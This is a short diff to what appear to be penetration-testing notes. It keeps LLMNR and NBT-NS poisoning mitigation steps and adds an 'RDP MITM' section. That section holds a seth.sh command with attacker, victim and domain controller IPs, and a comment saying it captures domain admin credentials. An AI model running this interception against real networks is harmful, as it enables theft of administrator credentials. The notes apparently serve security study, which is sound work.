@@ -42,3 +42,11 @@ LLMNR Poisoning mitigation :
 - "Turn OFF Multicast Name Resolution" under Local Computer Policy > Computer Configuration > Administrative Templates > Network > DNS Client in the Group policy editor.
 - DIsable NBT-NS, naviage to Network Connections > Network Adaptor Properties > TCP/IPv4 Properties > Advanced tab > Wins tab and select "Disable NetBIOS over TCP/IP"
 - Require good password policy 
+
+#### RDP MITM :
+
+```bash
+./seth.sh <interface> <attacker ip> <victum ip> <DC ip>
+./seth.sh eth0 192.168.154.137 192.168.154.131 192.168.154.134
+#when vitum domain admin group user try to connect to dc ip , account credentials we capture .
+```
